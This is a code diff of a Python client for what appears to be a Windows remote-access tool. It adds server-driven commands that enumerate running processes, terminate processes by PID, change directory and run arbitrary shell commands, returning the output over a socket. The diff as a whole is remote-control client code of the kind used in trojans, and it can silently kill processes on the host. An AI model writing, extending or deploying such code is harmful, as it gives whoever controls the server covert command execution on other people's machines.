@@ -8,6 +8,7 @@ import sys
 import os
 import platform
 import ctypes
+from ctypes.wintypes import MSG
 import threading
 import subprocess
 
@@ -49,6 +50,20 @@ User32 = ctypes.windll.user32
 Shell32 = ctypes.windll.shell32
 Gdi32 = ctypes.windll.gdi32
 Psapi = ctypes.windll.psapi
+
+# Init Processes Variables
+EnumProcesses = Psapi.EnumProcesses
+EnumProcesses.restype = ctypes.wintypes.BOOL
+GetProcessImageFileName = Psapi.GetProcessImageFileNameA
+GetProcessImageFileName.restype = ctypes.wintypes.DWORD
+OpenProcess = Kernel32.OpenProcess
+OpenProcess.restype = ctypes.wintypes.HANDLE
+TerminateProcess = Kernel32.TerminateProcess
+TerminateProcess.restype = ctypes.wintypes.BOOL
+CloseHandle = Kernel32.CloseHandle
+MAX_PATH = 260
+PROCESS_TERMINATE = 0x0001
+PROCESS_QUERY_INFORMATION = 0x0400
 
 
 def check_info():
@@ -124,6 +139,7 @@ def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
 ###
 # FUNCTIONS
 ###
+# Run Shell Command
 def run_shell(cmde):
     if cmde:
         try:
@@ -136,6 +152,31 @@ def run_shell(cmde):
 
     else:
         return "Enter a command.\n"
+
+# Get Processes
+def get_processes_list():
+    PROCESSES = {}
+    max_array = ctypes.c_ulong * 4096
+    pProcessIds = max_array()
+    pBytesReturned = ctypes.c_ulong()
+    Psapi.EnumProcesses(ctypes.byref(pProcessIds), ctypes.sizeof(pProcessIds), ctypes.byref(pBytesReturned))
+    nReturned = pBytesReturned.value/ctypes.sizeof(ctypes.c_ulong())
+    pidProcessArray = [i for i in pProcessIds][:nReturned]
+    for ProcessId in pidProcessArray:
+        hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, ProcessId)
+        if hProcess:
+            ImageFileName = (ctypes.c_char*MAX_PATH)()
+            if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
+                filename = os.path.basename(ImageFileName.value)
+                PROCESSES[ProcessId] = filename
+            CloseHandle(hProcess)
+    return str(PROCESSES)
+
+
+# Terminate Process
+def terminateProcess(PID):
+    hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
+    TerminateProcess(hProcess, 1)
 
 
 def send_info(sock):
@@ -200,11 +241,33 @@ def reactor():
                                     try:
                                         data = data_receive(server_socket)
 
+                                        # Lock Client
                                         if data['payload'] == 'lockClient':
                                             UNLOCKED = False
+                                            continue
 
+                                        # Choose dir
+                                        elif data['payload'].startswith('cd '):
+                                            try:
+                                                os.chdir(data['payload'][3:])
+                                                output = ''
+                                            except:
+                                                output = 'dirOpenError'
+
+                                        # Get Processes List
+                                        elif data['payload'] == 'getProcessesList':
+                                            output = get_processes_list()
+
+                                        # Terminate Process
+                                        elif data['payload'].startswith('terminateProcess '):
+                                            pid = data['payload'].split()[-1]
+                                            terminateProcess(int(pid))
+                                            continue
+
+                                        # Run Shell
                                         else:
-                                            data_send(server_socket, run_shell(data['payload']), 'shellMode', session_id=data['session_id'])
+                                            output = run_shell(data['payload'])
+                                        data_send(server_socket, output, 'shellMode', session_id=data['session_id'])
 
                                     except socket.error:
                                         break
